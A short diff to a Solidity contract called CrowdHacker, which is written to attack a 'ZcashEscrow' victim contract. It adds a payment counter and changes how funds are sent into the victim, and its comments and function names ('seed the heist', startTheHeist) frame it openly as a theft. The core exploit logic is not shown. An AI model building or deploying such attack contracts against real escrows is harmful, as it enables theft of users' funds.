@@ -6,13 +6,15 @@ contract CrowdHacker {
 
   ZcashEscrow public victim;
   address public owner;
-    
+  uint public paid;
+ 
   function CrowdHacker() {
     owner = msg.sender;
   }
 
   function initiateHack(address _victim) {
     victim = ZcashEscrow(_victim);
+    paid = 0;
   }
 
   // Pay into the CrowdHacker to seed the heist
@@ -20,9 +22,7 @@ contract CrowdHacker {
   }
 
   function payIntoVictim() {
-    if (!address(victim).send(this.balance)) {
-      throw;
-    } // pass the money along, or throw a tantrum if we can't
+    victim.payIn.value(this.balance)("Crowd Hacker");
   }
 
   function startTheHeist() {
